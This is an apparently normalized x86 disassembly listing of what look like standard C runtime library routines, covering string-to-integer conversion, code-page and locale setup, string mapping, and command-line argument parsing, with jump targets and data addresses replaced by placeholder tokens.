mov eax [ ebp + 0xc ]
pop esi
pop ebx
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx esi [ edi ]
add edi 0x2
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x4 ]
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
sub_1007968d
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x30 ]
call sub_10054678
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
xor ecx ecx
cmp eax ecx
je r-xdata
cmp ebx ecx
jne r-xdata
mov [ eax ] ebx
cmp [ ebp + 0x14 ] ecx
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x24 ] 0x0
je r-xdata
push esi
movzx esi [ ebx ]
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
lea edi [ ebx + 0x2 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x8
push esi
call sub_1000906c
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop ebx
leave
retn
movzx esi [ edi ]
add edi 0x2
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
movzx esi [ edi ]
add edi 0x2
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
xor eax eax
xor edx edx
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x10
pop ebx
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
call sub_1002d975
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
push eax
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
call sub_1007b3f0
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
push esi
call sub_1002d975
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x14 ] ebx
cmp eax 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
sub edi 0x2
test al 0x8
jne r-xdata
mov ecx [ ebp - 0x4 ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0xc ]
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
movzx esi [ edi + 0x2 ]
add edi 0x4
cmp eax 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
push ecx
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_1007b490
xor ecx ecx
add eax ebx
adc edx ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
ja r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_10012991
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edi [ ebp + 0xc ]
push esi
call sub_1002d975
mov ebx eax
pop ecx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
lea ebx [ eax - 0x37 ]
sub eax 0x20
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x8 ] 0xffffffff
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0xc ]
jne r-xdata
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] ebx
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
movzx esi [ edi ]
add edi 0x2
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x14 ]
jb r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] esi
jb r-xdata
jb r-xdata
ja r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
cmp ebx [ ebp - 0x18 ]
jbe r-xdata
pop edi
pop esi
cmp [ ebp - 0x8 ] 0xffffffff
jbe r-xdata
sub_10079934
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_10079963
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_10078970
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_100799c7
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_10058442
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_1000a03a
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_1000a03a
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_10078970
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_10079b57
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10079bd3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_10036463
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_10056814
pop ecx
cmp eax ebx
je r-xdata
call sub_1007c030
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_10036463
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_10056814
pop ecx
cmp eax ebx
je r-xdata
call sub_1007c030
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_10079dba
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_1004a2b3
pop ecx
pop edi
sub_10079de0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0xc ] ebx
call sub_10028397
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
push [ esi + 0x58 ]
mov ebx 0x351
push r--data
push [ r--data ]
push 0x3
push ebx
push edi
call sub_10001108
lea eax [ esi + 0x58 ]
add esp 0x18
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x8 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000b659
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x10 ]
push [ ecx ]
mov [ ebp - 0x8 ] ecx
push [ eax ]
call sub_10078c40
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
add [ ebp - 0x4 ] 0xc
push r--data
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push [ eax ]
push 0x3
push ebx
push edi
call sub_10001108
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_10020a90
pop ecx
push r--data
push ebx
push edi
call sub_10005dab
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ esi + 0x54 ]
call sub_10020a90
pop ecx
push [ ebp - 0x10 ]
call sub_10020a90
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_10020a90
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_10020a90
pop ecx
sub_10079f45
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x198 ] eax
call sub_10044fed
mov edi eax
push ebx
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x198 ]
call sub_1005d58c
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
add ebx esi
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10078c40
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x88 ]
push eax
call sub_10078ac0
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_10028397
pop ecx
pop ecx
mov [ ebp - 0x194 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebp - 0x190 ]
mov [ ebp - 0x198 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
mov [ ebp - 0x1a8 ] eax
mov eax [ eax ]
mov [ ebp - 0x1b8 ] eax
lea eax [ ecx + 0x6 ]
imul eax eax 0x6
add eax esi
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c8 ]
push eax
call sub_10078600
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x194 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_10005e18
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000b659
int3
mov eax [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_10078600
add esp 0xc
cmp [ ebp - 0x190 ] 0x2
jne r-xdata
cmp [ ebp - 0x190 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1a4 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x1f4 ]
mov ecx [ edi + 0x1f0 ]
mov [ ebp - 0x19c ] eax
lea eax [ edi + 0x1d0 ]
mov eax [ ebp - 0x190 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c0 ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x198 ] rw-data
je r-xdata
mov eax [ ebp - 0x198 ]
push [ ebp - 0x194 ]
mov [ ebx + 0x48 ] eax
call sub_10020a90
mov eax [ ebp - 0x1b8 ]
pop ecx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 + 0x1d0 ]
mov edx [ eax ]
mov [ edi + 0x1d0 ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x1d4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x190 ]
mov eax [ ebp - 0x194 ]
add ecx 0x5
add ecx ecx
mov [ eax ] 0x1
mov [ esi + ecx * 8 ] eax
jmp r-xdata
mov edi [ ebp - 0x190 ]
add edi 0x5
add edi edi
push [ esi + edi * 8 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x1d4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_10058442
add esp 0x20
test eax eax
je r-xdata
push [ esi + edi * 8 ]
call sub_10020a90
push [ ebx + 0x54 ]
call sub_10020a90
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x1d4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_100594b5
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x1d4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x1d0 ] eax
sub_1007a27f
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_10079de0
cmp [ eax ] 0x4c
jne r-xdata
add ecx ecx
mov eax [ esi + ecx * 8 + 0x48 ]
jmp r-xdata
push eax
call sub_10079f45
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call sub_1005d58c
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ eax + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
lea edi [ esi + 0x48 ]
cmp [ eax + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10078c40
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
mov ecx ebx
call sub_10079f45
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_1003ed16
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_10078ac0
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_1007c060
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_1005d3a9
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000b659
mov ecx [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
mov [ ebp + edi - 0x88 ] al
lea eax [ ebp - 0x88 ]
push eax
call sub_10079f45
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_1007c640
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_1007a49b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_1007a4d2
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_10042d1b
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_10042d1b
pop ecx
test eax eax
je r-xdata
call sub_10042d1b
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
